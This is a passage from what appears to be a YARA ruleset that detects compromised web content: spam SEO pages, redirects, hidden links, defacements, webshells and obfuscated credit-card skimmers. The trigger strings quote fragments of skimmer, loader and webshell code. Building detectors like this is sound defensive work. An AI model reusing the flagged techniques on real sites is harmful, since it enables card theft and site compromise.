        $ps0 = "xml:lang=\"ja\""
    condition:
        $ps0
}

rule html_spamseo_japanesespam_001 : spamseo
{
    strings:
        $trigger = "/wp-includes/SimplePie/"
    condition:
        $trigger and PR00581 and PR00582 and PR00247
}

private rule PR00583 : trigger
{
    strings:
        $ps0 = "/wc-logs/"
    condition:
        $ps0
}

rule html_spamseo_japanesespam_001_02 : spamseo
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00581 and PR00583 and PR00582
}

rule html_spamseo_japanesespam_001_03 : spamseo
{
    strings:
        $trigger = "/wp-includes/SimplePie/"
    condition:
        $trigger and PR00583 and PR00582 and PR00247
}

rule html_spamseo_japanesespam_001_04 : spamseo
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00581 and PR00583 and PR00582
}

private rule PR00584 : trigger
{
    strings:
        $ps0 = "<title>  \xc3\x83\xc2\xa6\xc3\x85\xe2\x80\x9c\xc3\x82\xc2\xaa\xc3\x83\xc2\xa6\xc3\xa2\xe2\x82\xac\xc2\xb0\xc3\x82\xc2\xbe\xc3\x83\xc2\xa5\xc3\x8b\xe2\x80\xa0\xc3\x82\xc2\xb0\xc3\x83\xc2\xa9\xc3\x82\xc2\xa1\xc3\x82\xc2\xb5\xc3\x83\xc2\xa9\xc3\x82\xc3\x82\xc2\xa2 - \xc3\x83\xc2\xa5\xc3\x82\xc3\x82\xc2\xa4\xc3\x83\xc2\xa6\xc3\x85\xe2\x80\x9c\xc3\x8b\xe2\x80\xa0"
    condition:
        $ps0
}

rule html_spamseo_japanesespam_002 : spamseo
{
    strings:
        $trigger = "<title>404 Not Found"
    condition:
        $trigger and PR00246 and PR00584
}

private rule PR00585 : trigger
{
    strings:
        $ps0 = "<title>&#"
    condition:
        $ps0
}

rule html_spamseo_japanesespam_005 : spamseo
{
    strings:
        $trigger = "Copyright 2015 Crockett & Jones. All rights reserved."
    condition:
        $trigger and PR00585 and PR00246
}

private rule PR00586 : trigger
{
    strings:
        $ps0 = "<img src=\"http://www.orbis.co.jp/contents/images/foot"
    condition:
        $ps0
}

rule html_spamseo_japanesespam_006 : spamseo
{
    strings:
        $trigger = "<html lang=\"ja\">"
    condition:
        $trigger and PR00050 and PR00586
}

private rule PR00587 : trigger
{
    strings:
        $ps0 = "\"copyright\"><a href=\"http://www.continuer.jp/policy.php\">privacy policy</a>"
    condition:
        $ps0
}

rule html_spamseo_japanesespam_006_002 : spamseo
{
    strings:
        $trigger = "<html lang=\"ja\">"
    condition:
        $trigger and PR00050 and PR00585 and PR00587
}

private rule PR00588 : trigger
{
    strings:
        $ps0 = "Yahoo Japan Corporation. All Rights Reserved."
    condition:
        $ps0
}

rule html_spamseo_japanesespam_006_003 : spamseo
{
    strings:
        $trigger = "<html lang=\"ja\">"
    condition:
        $trigger and PR00588 and PR00050 and PR00585
}

private rule PR00589 : trigger
{
    strings:
        $ps0 = "<div "
    condition:
        $ps0
}

private rule PR00590 : trigger
{
    strings:
        $ps0 = "<title>#bbbtitsbbb#</title>"
    condition:
        $ps0
}

rule html_spamseo_japanesespam_008 : spamseo
{
    strings:
        $trigger = "content=\"#bbb"
    condition:
        $trigger and PR00589 and PR00590
}

private rule PR00591 : trigger
{
    strings:
        $ps0 = "<title>\xe3\x83\x96\xe3\x83\xa9\xe3\x83\xb3\xe3\x83\x89\xe3\x82\xb3\xe3\x83\x94"
    condition:
        $ps0
}

rule html_spamseo_japanesespam_009 : spamseo
{
    strings:
        $trigger = "<a href="
    condition:
        $trigger and PR00591
}

rule html_spamseo_peepingtom_001_001 : spamseo
{
    strings:
        $trigger = "<p class=\"pitch\">Spyera is the most powerful and undetectable Spy phone Software!<br>"
    condition:
        $trigger and PR00589
}

rule html_spamseo_peepingtom_001_002 : spamseo
{
    strings:
        $trigger = "document.write(\"<a href='//www.liveinternet.ru/click;EN_SPY_spyera"
    condition:
        $trigger and PR00589
}

rule html_spamseo_pharmasite_002 : spamseo
{
    strings:
        $trigger = "@OPGviagra"
    condition:
        $trigger and PR00246
}

private rule PR00592 : trigger
{
    strings:
        $ps0 = "<?php $pill = '"
    condition:
        $ps0
}

rule html_spamseo_pharmasite_003 : spamseo
{
    strings:
        $trigger = "<?php include ('./"
    condition:
        $trigger and PR00592
}

rule html_spamseo_pharmasite_004 : spamseo
{
    strings:
        $trigger = "<title>Acheter des st\xc3\xa9ro\xc3\xafdes"
    condition:
        $trigger
}

rule html_spamseo_pharmasite_004_02 : spamseo
{
    strings:
        $trigger = "<title>Tout sur la pharmacologie"
    condition:
        $trigger
}

rule html_spamseo_pharmasite_004_03 : spamseo
{
    strings:
        $trigger = "<title>Les m\xc3\xa9dicaments anabolisants"
    condition:
        $trigger
}

rule html_spamseo_pharmasite_004_04 : spamseo
{
    strings:
        $trigger = "index.html\">Tout sur la pharmacologie du sport</a>"
    condition:
        $trigger and PR00042
}

private rule PR00593 : trigger
{
    strings:
        $ps0 = "=\"promo.php?utm_term="
    condition:
        $ps0
}

rule html_spamseo_pornspam_001 : spamseo
{
    strings:
        $trigger = "porn"
    condition:
        $trigger and PR00593 and PR00247
}

rule html_spamseo_pornspam_002 : spamseo
{
    strings:
        $trigger = "X Tube Movies. Premium Sex Clip"
    condition:
        $trigger and PR00042
}

private rule PR00594 : trigger
{
    strings:
        $ps0 = "<li><a href=\"Chat-cam-sin-registro"
    condition:
        $ps0
}

rule html_spamseo_pornspam_003 : spamseo
{
    strings:
        $trigger = "porn"
    condition:
        $trigger and PR00594 and PR00247
}

private rule PR00595 : trigger
{
    strings:
        $ps0 = "<title>{title}</title>"
    condition:
        $ps0
}

rule html_spamseo_pornspam_003_02 : spamseo
{
    strings:
        $trigger = "document.cookie.match(/(^|;)?liwasujajaqe=([^;]*)(;|$)/)){"
    condition:
        $trigger and PR00595
}

rule html_spamseo_redirect_001 : spamseo
{
    strings:
        $trigger = "l = \"http://img.\" + a + \"-\" + b + \".info/emptya2.gif?i=\" + r + \"&r=\" + document.referrer;"
    condition:
        $trigger
}

rule html_spamseo_redirect_002 : spamseo
{
    strings:
        $trigger = "You see this page because one of your friends <br> have invited you.<br>"
    condition:
        $trigger
}

private rule PR00596 : trigger
{
    strings:
        $ps0 = "<meta"
    condition:
        $ps0
}

rule html_spamseo_redirect_003 : spamseo
{
    strings:
        $trigger = "content=\"1;url=http://safe-med"
    condition:
        $trigger and PR00596
}

private rule PR00597 : trigger
{
    strings:
        $ps0 = "<meta http-equiv=\"refresh\" content=\"1;URL=http"
    condition:
        $ps0
}

rule html_spamseo_redirect_005 : spamseo
{
    strings:
        $trigger = "<meta name=\"description\" content=\"ok file uploaded\">"
    condition:
        $trigger and PR00597
}

private rule PR00598 : trigger
{
    strings:
        $ps0 = "<meta http-equiv=\"refresh\" content=\"0;URL=http"
    condition:
        $ps0
}

rule html_spamseo_redirect_005_02 : spamseo
{
    strings:
        $trigger = "<meta name=\"description\" content=\"ok file uploaded\">"
    condition:
        $trigger and PR00598
}

rule html_spamseo_redirect_006 : spamseo
{
    strings:
        $trigger = "<title>\xd0\xa1\xd0\xb5\xd0\xba\xd1\x83\xd0\xbd\xd0\xb4\xd0\xbe\xd1\x87\xd0\xba\xd1\x83...</title>"
    condition:
        $trigger
}

rule html_spamseo_redirect_010 : spamseo
{
    strings:
        $trigger = "<title>[cmb.]</title>"
    condition:
        $trigger
}

rule html_spamseo_redirect_011 : spamseo
{
    strings:
        $trigger = "<meta http-equiv=\"refresh\" content=\"0; url=https://put-pay.ru/"
    condition:
        $trigger
}

rule html_spamseo_redirect_012 : spamseo
{
    strings:
        $trigger = "<meta http-equiv=\"refresh\" content=\"0; url=http://lazyessayclub.com/"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule html_spamseo_redirect_014 : spamseo
{
    strings:
        $trigger = "<script"
        $html_spamseo_redirect_014_r0 = /<script>[\s]*var [\w]+[\s]*=[\s]*\"[^\"]\";[\s]*window\.location\.href[\s]*=[\s]*\"htt[^\";]+\"[\s]*\+[\s]*[\w]+[\s]*\+[\s]*\"[^\"]+\";[\s]*<.script>/
    condition:
        $trigger and PR00371 and $html_spamseo_redirect_014_r0
}

rule html_spamseo_redirect_015 : spamseo
{
    strings:
        $trigger = "<meta http-equiv=\"refresh\" content=\"0;URL='https://bit.ly"
    condition:
        $trigger
}

private rule PR00599 : trigger
{
    strings:
        $ps0 = "setTimeout(\"window.location.replace('http"
    condition:
        $ps0
}

rule html_spamseo_redirect_016 : spamseo
{
    strings:
        $trigger = "<meta http-equiv=\"refresh\" content=\"0;"
    condition:
        $trigger and PR00599
}

rule html_spamseo_redirect_017 : spamseo
{
    strings:
        $trigger = "<meta http-equiv=\"refresh\" content=\"5; url=http://trustdelivery.su"
    condition:
        $trigger
}

rule html_spamseo_redirect_018 : spamseo
{
    strings:
        $trigger = "<meta http-equiv=\"refresh\" content=\"3; url=http://herbalglobalinc.eu"
    condition:
        $trigger
}

rule html_spamseo_redirect_019 : spamseo
{
    strings:
        $trigger = "<meta http-equiv=\"refresh\" content=\"1; url=http://goodfirstreward.eu"
    condition:
        $trigger
}

rule html_spamseo_redirect_021 : spamseo
{
    strings:
        $trigger = "index><img src='0' onerror= top.location.href="
    condition:
        $trigger
}

private rule PR00600 : trigger
{
    strings:
        $ps0 = "email.split(\""
    condition:
        $ps0
}

private rule PR00601 : trigger
{
    strings:
        $ps0 = "</head><body></body></html>"
    condition:
        $ps0
}

private rule PR00602 : trigger
{
    strings:
        $ps0 = "(window.location.search);"
    condition:
        $ps0
}

rule html_spamseo_redirect_022 : spamseo
{
    strings:
        $trigger = "= \"@\";"
    condition:
        $trigger and PR00050 and PR00600 and PR00601 and PR00602
}

rule html_spamseo_redirect_024 : spamseo
{
    strings:
        $trigger = "<meta http-equiv=\"refresh\" content=\"0;URL=http://onlinedates.ru"
    condition:
        $trigger
}

rule html_spamseo_redirect_025 : spamseo
{
    strings:
        $trigger = "<meta http-equiv=\"refresh\" content=\"0;url=https://rxcheapplace.shop"
    condition:
        $trigger
}

private rule PR00603 : trigger
{
    strings:
        $ps0 = "|iframe|"
    condition:
        $ps0
}

private rule PR00604 : trigger
{
    strings:
        $ps0 = "eval(function(p,a,c,k,e,"
    condition:
        $ps0
}

rule html_spamseo_replicadoorway_001 : spamseo
{
    strings:
        $trigger = "content=\"Replica"
    condition:
        $trigger and PR00603 and PR00604
}

rule html_spamseo_spamlinks_002 : spamseo
{
    strings:
        $trigger = "--><a title=\\\"Site"
    condition:
        $trigger
}

rule html_spamseo_spamlinks_003 : spamseo
{
    strings:
        $trigger = "<title>seotramp.com"
    condition:
        $trigger
}

private rule PR00605 : trigger
{
    strings:
        $ps0 = "<p hidden><a href=\""
    condition:
        $ps0
}

rule html_spamseo_spamlinks_004 : spamseo
{
    strings:
        $trigger = ">buy"
    condition:
        $trigger and PR00605
}

private rule PR00606 : trigger
{
    strings:
        $ps0 = "$data = str_replace(base64_decode("
    condition:
        $ps0
}

rule html_spamseo_spamlinks_006 : spamseo
{
    strings:
        $trigger = "$data = $document->render( $this->getCfg('caching'), $params);"
    condition:
        $trigger and PR00606
}

private rule PR00607 : trigger
{
    strings:
        $ps0 = "echo str_replace(base64_decode("
    condition:
        $ps0
}

rule html_spamseo_spamlinks_008 : spamseo
{
    strings:
        $trigger = "$a = JResponse::toString($mainframe->getCfg('gzip'));"
    condition:
        $trigger and PR00607
}

rule html_spamseo_spamlinks_010 : spamseo
{
    strings:
        $trigger = "if(!navigator.userAgent.match(/Google Web Preview|bot"
    condition:
        $trigger and PR00050 and PR00323
}

rule html_spamseo_spamlinks_011 : spamseo
{
    strings:
        $trigger = "<a href=\"http://www.japanfemdom.org"
    condition:
        $trigger
}

rule html_spamseo_spamlinks_013 : spamseo
{
    strings:
        $trigger = "span class=\"mylinkcode\"><p style=\"position: absolute"
    condition:
        $trigger
}

private rule PR00608 : trigger
{
    strings:
        $ps0 = "* Front to the WordPress application."
    condition:
        $ps0
}

private rule PR00609 : trigger
{
    strings:
        $ps0 = "</a>&nbsp"
    condition:
        $ps0
}

rule html_spamseo_spamlinks_014 : spamseo
{
    strings:
        $trigger = "define"
    condition:
        $trigger and PR00608 and PR00609 and PR00246
}

private rule PR00610 : trigger
{
    strings:
        $ps0 = "divHrefB"
    condition:
        $ps0
}

rule html_spamseo_spamlinks_015 : spamseo
{
    strings:
        $trigger = "<a href="
    condition:
        $trigger and PR00540 and PR00610
}

// MANUAL FIX NECESSARY
rule html_spamseo_spam_template_001 : spamseo
{
    strings:
        $trigger = "<meta content=\"#description#\" name=\"description\"/>"
        $html_spamseo_spam_template_001_r0 = /<title>[\s]*#title#[\s]*<.title>/
    condition:
        $trigger and PR00042 and $html_spamseo_spam_template_001_r0
}

private rule PR00611 : trigger
{
    strings:
        $ps0 = "<!-- #wordpress_hide -->"
    condition:
        $ps0
}

private rule PR00612 : trigger
{
    strings:
        $ps0 = "{position:absolute;clip:rect("
    condition:
        $ps0
}

rule html_spamseo_wordpress_hide_001 : spamseo
{
    strings:
        $trigger = "<div "
    condition:
        $trigger and PR00611 and PR00612
}

rule html_spamseo_wordpress_hide_002 : spamseo
{
    strings:
        $trigger = "{position:absolute;top:-"
    condition:
        $trigger and PR00611 and PR00589
}

private rule PR00613 : trigger
{
    strings:
        $ps0 = "open_basedir = OFF"
    condition:
        $ps0
}

private rule PR00614 : trigger
{
    strings:
        $ps0 = "shell_exec = ON"
    condition:
        $ps0
}

rule ini_safety_off_001 : safety
{
    strings:
        $trigger = "safe_mode"
    condition:
        $trigger and PR00613 and PR00614
}

rule js_backdoor_webshell_001 : backdoor
{
    strings:
        $trigger = "server : <font color=green><!--#exec cmd=\"{uname,-nr}\" --></font><br>"
    condition:
        $trigger and PR00322 and PR00050 and PR00323
}

private rule PR00615 : trigger
{
    strings:
        $ps0 = "while(1){s=document.body.innerHTML+=s+=document.body.innerHTML;}"
    condition:
        $ps0
}

rule js_backdoor_xss_shell_001 : backdoor
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR00013 and PR00615
}

// MANUAL FIX NECESSARY
private rule PR00616 : trigger
{
    strings:
        $ps0 = "</script><!--/"
    condition:
        $ps0
}

private rule PR00617 : trigger
{
    strings:
        $ps0 = ";try{"
    condition:
        $ps0
}

rule js_blackhole_generic_001 : blackhole
{
    strings:
        $trigger = "--><script"
        $js_blackhole_generic_001_r0 = /<!--\w\w\w\w\w\w--><script/
    condition:
        $trigger and PR00616 and PR00617 and $js_blackhole_generic_001_r0
}

// MANUAL FIX NECESSARY
rule js_blackhole_generic_002 : blackhole
{
    strings:
        $trigger = "--><script type=\"text/javascript\" src="
        $js_blackhole_generic_002_r0 = /<!--\w\w\w\w\w\w--><script/
    condition:
        $trigger and PR00616 and $js_blackhole_generic_002_r0
}

// MANUAL FIX NECESSARY
rule js_blackhole_generic_002_02 : blackhole
{
    strings:
        $trigger = "--><script src="
        $js_blackhole_generic_002_02_r0 = /<!--\w\w\w\w\w\w--><script/
    condition:
        $trigger and PR00616 and $js_blackhole_generic_002_02_r0
}

rule js_blackhole_generic_003 : blackhole
{
    strings:
        $trigger = "define('HDDD467FFEY322', 1);}/*"
    condition:
        $trigger and PR00091
}

private rule PR00618 : trigger
{
    strings:
        $ps0 = ";if(window.document)for"
    condition:
        $ps0
}

private rule PR00619 : trigger
{
    strings:
        $ps0 = "try{q="
    condition:
        $ps0
}

rule js_blackhole_generic_004 : blackhole
{
    strings:
        $trigger = "document.createElement(\"p\");"
    condition:
        $trigger and PR00618 and PR00619
}

// MANUAL FIX NECESSARY
private rule PR00620 : trigger
{
    strings:
        $ps0 = "e=window["
    condition:
        $ps0
}

rule js_blackhole_generic_004_02 : blackhole
{
    strings:
        $trigger = "document.createElement(\"p\");"
        $js_blackhole_generic_004_02_r0 = />[\s]*s=\"\";/
    condition:
        $trigger and PR00620 and PR00619 and $js_blackhole_generic_004_02_r0
}

private rule PR00621 : trigger
{
    strings:
        $ps0 = "window"
    condition:
        $ps0
}

rule js_blackhole_generic_004_03 : blackhole
{
    strings:
        $trigger = "\"c\"+\"r\":2+\"e\"+\"a\"+\"t\"+\"e\"+\"E"
    condition:
        $trigger and PR00621 and PR00323
}

private rule PR00622 : trigger
{
    strings:
        $ps0 = "+= String.fromCharCode(Math.floor((tmp/Math.pow("
    condition:
        $ps0
}

rule js_defaced_generic_094 : defaced
{
    strings:
        $trigger = "document.write("
    condition:
        $trigger and PR00050 and PR00622
}

private rule PR00623 : trigger
{
    strings:
        $ps0 = "Sh4d0w Pr0x"
    condition:
        $ps0
}

rule js_defaced_generic_095 : defaced
{
    strings:
        $trigger = ">"
    condition:
        $trigger and PR00623
}

private rule PR00624 : trigger
{
    strings:
        $ps0 = "%25%33%35%25%32%35%25%33%33%25%33%32%25%32%35%25%33%33%25%33%35%25%32%35%25%33%33%25%33%33%25%32%35%25%33%34%25%33%35%25%32%35%25%"
    condition:
        $ps0
}

rule js_defaced_generic_096 : defaced
{
    strings:
        $trigger = "document.write("
    condition:
        $trigger and PR00624 and PR00050
}

private rule PR00625 : trigger
{
    strings:
        $ps0 = "u003C\\u0068\\u0074\\u006D\\u006C\\u003E\\u000A"
    condition:
        $ps0
}

rule js_defaced_generic_097 : defaced
{
    strings:
        $trigger = "document.write("
    condition:
        $trigger and PR00625 and PR00050
}

rule js_defaced_HUMAN_CRAZY99_001 : defaced
{
    strings:
        $trigger = "<script language=javascript>document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61"
    condition:
        $trigger
}

rule js_defaced_script_001 : defaced
{
    strings:
        $trigger = "JavaScript\">alert(\" Yayank Riri"
    condition:
        $trigger
}

rule js_defaced_script_002 : defaced
{
    strings:
        $trigger = "document.write(unescape('%3C%74%69%74%6C%65%3E%46%75%63%6B%65%64"
    condition:
        $trigger
}

rule js_defaced_script_003 : defaced
{
    strings:
        $trigger = "alert(\"Indonesian people in here\");"
    condition:
        $trigger
}

private rule PR00626 : trigger
{
    strings:
        $ps0 = "var text=\\\"./H4CK3D"
    condition:
        $ps0
}

rule js_defaced_script_005 : defaced
{
    strings:
        $trigger = "Hack"
    condition:
        $trigger and PR00626
}

private rule PR00627 : trigger
{
    strings:
        $ps0 = "\\u0074\\u0069\\u0074\\u006C\\u0065\\u003D\\u0020\\u0022\\u0048\\u0061\\u0063\\u006B"
    condition:
        $ps0
}

rule js_defaced_script_009 : defaced
{
    strings:
        $trigger = "ocument.write"
    condition:
        $trigger and PR00627
}

rule js_defaced_script_010 : defaced
{
    strings:
        $trigger = "%3b%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%64%29%3b%3c%2f%73%63%72%69%70%74%3e"
    condition:
        $trigger and PR00231
}

rule js_defaced_script_012 : defaced
{
    strings:
        $trigger = "messages[0] = \"You Has Been Hacked!!\""
    condition:
        $trigger
}

rule js_defaced_script_014 : defaced
{
    strings:
        $trigger = "document.write(unescape('%3C%68%74%6D%6C%3E%0A%3C%68%65%61%64%3E%"
    condition:
        $trigger
}

private rule PR00628 : trigger
{
    strings:
        $ps0 = "%48%61%63"
    condition:
        $ps0
}

rule js_defaced_script_015 : defaced
{
    strings:
        $trigger = "ocument.write"
    condition:
        $trigger and PR00628
}

private rule PR00629 : trigger
{
    strings:
        $ps0 = "%50%77%6E"
    condition:
        $ps0
}

rule js_defaced_script_016 : defaced
{
    strings:
        $trigger = "ocument.write"
    condition:
        $trigger and PR00629
}

rule js_defaced_script_017 : defaced
{
    strings:
        $trigger = "Hacked%20By%20OoS"
    condition:
        $trigger
}

private rule PR00630 : trigger
{
    strings:
        $ps0 = "setTimeout("
    condition:
        $ps0
}

rule js_defaced_script_018 : defaced
{
    strings:
        $trigger = "var mymessage = \"HOW HAPPY IS THE MAN WHO SAYS"
    condition:
        $trigger and PR00042 and PR00630
}

private rule PR00631 : trigger
{
    strings:
        $ps0 = "Exploit By Anonymous Ghost Gaza"
    condition:
        $ps0
}

rule js_exploit_wordpress_001 : exploit
{
    strings:
        $trigger = "File"
    condition:
        $trigger and PR00631
}

rule js_hacktool_ddos_001 : hacktool
{
    strings:
        $trigger = "<title>Garuda DDOS "
    condition:
        $trigger
}

private rule PR00632 : trigger
{
    strings:
        $ps0 = "eval(atob"
    condition:
        $ps0
}

rule js_hacktool_mage_shoplifter_001_001 : hacktool
{
    strings:
        $trigger = "cz0namc"
    condition:
        $trigger and PR00632
}

private rule PR00633 : trigger
{
    strings:
        $ps0 = "ZXZhbChm"
    condition:
        $ps0
}

rule js_hacktool_mage_shoplifter_001_003 : hacktool
{
    strings:
        $trigger = "eval(atob"
    condition:
        $trigger and PR00633
}

rule js_hacktool_mage_shoplifter_001_02 : hacktool
{
    strings:
        $trigger = "dmFyI"
    condition:
        $trigger and PR00632
}

rule js_iframe_scanbox_001 : iframe
{
    strings:
        $trigger = "88.80.190.133"
    condition:
        $trigger and PR00261
}

rule js_malware_aiobot_001 : malware
{
    strings:
        $trigger = "aiobot.de/images/ads.js\"><"
    condition:
        $trigger and PR00050
}

rule js_malware_b374kshell_001 : malware
{
    strings:
        $trigger = "console.log('b374k> '+str);"
    condition:
        $trigger
}

private rule PR00634 : trigger
{
    strings:
        $ps0 = "\\x"
    condition:
        $ps0
}

private rule PR00635 : trigger
{
    strings:
        $ps0 = "new RegExp(_$_"
    condition:
        $ps0
}

private rule PR00636 : trigger
{
    strings:
        $ps0 = "],success:function(a)"
    condition:
        $ps0
}

private rule PR00637 : trigger
{
    strings:
        $ps0 = ";document[_"
    condition:
        $ps0
}

rule js_malware_cc_stealer_001 : malware
{
    strings:
        $trigger = "]](window[_$_"
    condition:
        $trigger and PR00634 and PR00635 and PR00636 and PR00637
}

private rule PR00638 : trigger
{
    strings:
        $ps0 = "],_0x"
    condition:
        $ps0
}

private rule PR00639 : trigger
{
    strings:
        $ps0 = "document[_0x"
    condition:
        $ps0
}

rule js_malware_cc_stealer_002 : malware
{
    strings:
        $trigger = "\"\\x66\\x72\\x6F\\x6D\\x43\\x68\\x61\\x72\\x43\\x6F\\x64\\x65\",\"\\x6D\\x61\\x70\",\"\",\"\\x72\\x65\\x70\\x6C\\x61\\x63\\x65\",\"\\x74\\x6F\\x53\\x74\\x72\\x69\\x6E\\x67\",\"\\x72\\x6F\\x74\\x31\\x33\""
    condition:
        $trigger and PR00638 and PR00639
}

rule js_malware_cc_stealer_003 : malware
{
    strings:
        $trigger = "location.href.search(atob('Y2hlY2tvdXQ="
    condition:
        $trigger and PR00323
}

private rule PR00640 : trigger
{
    strings:
        $ps0 = "\\x63\\x63\\x73\\x61\\x76\\x65\",\"\\x63\\x68\\x65\\x63\\x6B\\x6F\\x75\\x74"
    condition:
        $ps0
}

private rule PR00641 : trigger
{
    strings:
        $ps0 = "<script>"
    condition:
        $ps0
}

rule js_malware_cc_stealer_004 : malware
{
    strings:
        $trigger = "var _0x"
    condition:
        $trigger and PR00640 and PR00641
}

private rule PR00642 : trigger
{
    strings:
        $ps0 = "\\x63\\x63\\x5F\\x6E\\x75\\x6D\\x62\\x65\\x72"
    condition:
        $ps0
}

rule js_malware_cc_stealer_005 : malware
{
    strings:
        $trigger = "}}setInterval("
    condition:
        $trigger and PR00642 and PR00639
}

private rule PR00643 : trigger
{
    strings:
        $ps0 = "(i*maxlen,maxlen);enc=crypt[_0x"
    condition:
        $ps0
}

private rule PR00644 : trigger
{
    strings:
        $ps0 = "aHR0cD"
    condition:
        $ps0
}

rule js_malware_cc_stealer_006 : malware
{
    strings:
        $trigger = ";document[_"
    condition:
        $trigger and PR00634 and PR00643 and PR00644
}

private rule PR00645 : trigger
{
    strings:
        $ps0 = "void 0x0;"
    condition:
        $ps0
}

private rule PR00646 : trigger
{
    strings:
        $ps0 = "function(){let _0x"
    condition:
        $ps0
}

private rule PR00647 : trigger
{
    strings:
        $ps0 = "document["
    condition:
        $ps0
}

rule js_malware_cc_stealer_007 : malware
{
    strings:
        $trigger = "try{const _0x"
    condition:
        $trigger and PR00645 and PR00646 and PR00647
}

private rule PR00648 : trigger
{
    strings:
        $ps0 = "'1337'"
    condition:
        $ps0
}

rule js_malware_cc_stealer_007_02 : malware
{
    strings:
        $trigger = "'cvv_listener','exp_listener','$1\\x20/\\x20$2'"
    condition:
        $trigger and PR00639 and PR00638 and PR00648
}

private rule PR00649 : trigger
{
    strings:
        $ps0 = "function validateCreditCard(s"
    condition:
        $ps0
}

private rule PR00650 : trigger
{
    strings:
        $ps0 = "decodeURI(\"3%20.5*%1C1"
    condition:
        $ps0
}

rule js_malware_cc_stealer_008 : malware
{
    strings:
        $trigger = "new RegExp"
    condition:
        $trigger and PR00649 and PR00650 and PR00323
}

private rule PR00651 : trigger
{
    strings:
        $ps0 = "t.type=\"text/javascript\",t.async=!0,t.src=(\"https:\"==document.location.protocol?\"https://\":\"http://\")+window.atob("
    condition:
        $ps0
}

private rule PR00652 : trigger
{
    strings:
        $ps0 = "document.createElement(\"script\")"
    condition:
        $ps0
}

rule js_malware_cc_stealer_009 : malware
{
    strings:
        $trigger = "document.body.appendChild"
    condition:
        $trigger and PR00651 and PR00652
}

private rule PR00653 : trigger
{
    strings:
        $ps0 = "document.getElement"
    condition:
        $ps0
}

private rule PR00654 : trigger
{
    strings:
        $ps0 = "function bom(){"
    condition:
        $ps0
}

rule js_malware_cc_stealer_010 : malware
{
    strings:
        $trigger = "setInterval(bom,"
    condition:
        $trigger and PR00653 and PR00654
}

private rule PR00655 : trigger
{
    strings:
        $ps0 = "document.getElementById('cloud')){document.getElementById('cloud').outerHTML = \""
    condition:
        $ps0
}

rule js_malware_cc_stealer_011 : malware
{
    strings:
        $trigger = ")).test(window.location) && !(new RegExp(\"cart\").test(window.location))){"
    condition:
        $trigger and PR00655
}

private rule PR00656 : trigger
{
    strings:
        $ps0 = "CVV':"
    condition:
        $ps0
}

private rule PR00657 : trigger
{
    strings:
        $ps0 = "TrySend':function()"
    condition:
        $ps0
}

rule js_malware_cc_stealer_012 : malware
{
    strings:
        $trigger = "GetCCInfo"
    condition:
        $trigger and PR00639 and PR00656 and PR00638 and PR00657
}

private rule PR00658 : trigger
{
    strings:
        $ps0 = "window[_"
    condition:
        $ps0
}

private rule PR00659 : trigger
{
    strings:
        $ps0 = "encData= encryptData(b);jQuery["
    condition:
        $ps0
}

private rule PR00660 : trigger
{
    strings:
        $ps0 = "document[_"
    condition:
        $ps0
}

rule js_malware_cc_stealer_013 : malware
{
    strings:
        $trigger = "typeof jQuery"
    condition:
        $trigger and PR00658 and PR00659 and PR00660
}

private rule PR00661 : trigger
{
    strings:
        $ps0 = ".join(\"&\"),n=getXmlHttp();"
    condition:
        $ps0
}

rule js_malware_cc_stealer_014 : malware
{
    strings:
        $trigger = ".setRequestHeader(\"Content-type"
    condition:
        $trigger and PR00653 and PR00661
}

private rule PR00662 : trigger
{
    strings:
        $ps0 = ".ico(decodeURIComponent(escape(window.atob("
    condition:
        $ps0
}

private rule PR00663 : trigger
{
    strings:
        $ps0 = "(function(){var root=this;var"
    condition:
        $ps0
}

rule js_malware_cc_stealer_016 : malware
{
    strings:
        $trigger = ";for(var"
    condition:
        $trigger and PR00662 and PR00663 and PR00323
}

private rule PR00664 : trigger
{
    strings:
        $ps0 = "document.getElementsByTagName"
    condition:
        $ps0
}

private rule PR00665 : trigger
{
    strings:
        $ps0 = ".src = atob("
    condition:
        $ps0
}

private rule PR00666 : trigger
{
    strings:
        $ps0 = ".parentNode.insertBefore("
    condition:
        $ps0
}

rule js_malware_cc_stealer_017 : malware
{
    strings:
        $trigger = "document.createElement('script')"
    condition:
        $trigger and PR00664 and PR00665 and PR00666
}

private rule PR00667 : trigger
{
    strings:
        $ps0 = "payment.save()"
    condition:
        $ps0
}

private rule PR00668 : trigger
{
    strings:
        $ps0 = "encodeURIComponent(btoa(unescape(encodeURIComponent(JSON[_0x"
    condition:
        $ps0
}

rule js_malware_cc_stealer_018 : malware
{
    strings:
        $trigger = "location"
    condition:
        $trigger and PR00667 and PR00323 and PR00668
}

rule js_malware_cc_stealer_019 : malware
{
    strings:
        $trigger = "document.write(unescape('%3C%73%63%72%69%70%74%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%20%6C%61%6E%67%75%61%67%65%3D%22%4A%61%76%61%73%63%72%69%70%74%22%3E%66%75%6E%63%74%69%6F%6E%20%68%74%6D%6C%5F%65%6E%63%6F%64%65%72"
    condition:
        $trigger and PR00050
}

private rule PR00669 : trigger
{
    strings:
        $ps0 = "var _0x"
    condition:
        $ps0
}

private rule PR00670 : trigger
{
    strings:
        $ps0 = "new RegExp(_0x"
    condition:
        $ps0
}

private rule PR00671 : trigger
{
    strings:
        $ps0 = "['HolderFirstName']!==null&&$"
    condition:
        $ps0
}

private rule PR00672 : trigger
{
    strings:
        $ps0 = ",'cc_payment','Holder','getElementById',"
    condition:
        $ps0
}

rule js_malware_cc_stealer_020 : malware
{
    strings:
        $trigger = "form-control-placeholder\\x22\\x20for=\\x22name\\x22>Card\\x20number</label></div><div\\x20class="
    condition:
        $trigger and PR00669 and PR00670 and PR00671 and PR00672 and PR00641
}

rule js_malware_cc_stealer_021 : malware
{
    strings:
        $trigger = ")) {document.cookie = \"currentnumber=\" + document.getElementById(\""
    condition:
        $trigger
}

private rule PR00673 : trigger
{
    strings:
        $ps0 = "decodeURIComponent(window.location.search.replace("
    condition:
        $ps0
}

private rule PR00674 : trigger
{
    strings:
        $ps0 = "+= '&default_keyword=' + encodeURIComponent(document.title);"
    condition:
        $ps0
}

rule js_malware_cc_stealer_022 : malware
{
    strings:
        $trigger = "document.createElement('script')"
    condition:
        $trigger and PR00664 and PR00673 and PR00666 and PR00674
}

private rule PR00675 : trigger
{
    strings:
        $ps0 = "substr"
    condition:
        $ps0
}

